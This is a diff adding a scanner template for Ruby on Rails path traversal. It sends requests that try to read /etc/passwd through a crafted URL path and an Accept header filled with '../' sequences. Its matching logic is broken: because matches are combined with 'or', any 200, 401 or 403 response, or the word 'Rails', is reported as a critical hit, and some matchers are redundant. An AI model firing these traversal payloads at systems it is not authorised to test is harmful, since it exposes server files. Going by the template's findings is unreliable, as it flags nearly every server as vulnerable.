@@ -1,0 +1,45 @@
+id: rails-misconfig
+info:
+  name: Ruby on Rails Misconfiguration Detection
+  author: pwn
+  severity: critical
+  description: Detects exposed Ruby on Rails instances vulnerable to path traversal, potentially leading to system file exposure.
+  tags: rails, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/file:///%2f%2f/etc/passwd"
+      - "{{BaseURL}}:3000/file:///%2f%2f/etc/passwd"
+    headers:
+      Accept: ../../../../../../../../etc/passwd
+      X-Forwarded-Scheme: http
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Rails"
+          - "passwd"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Rails"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
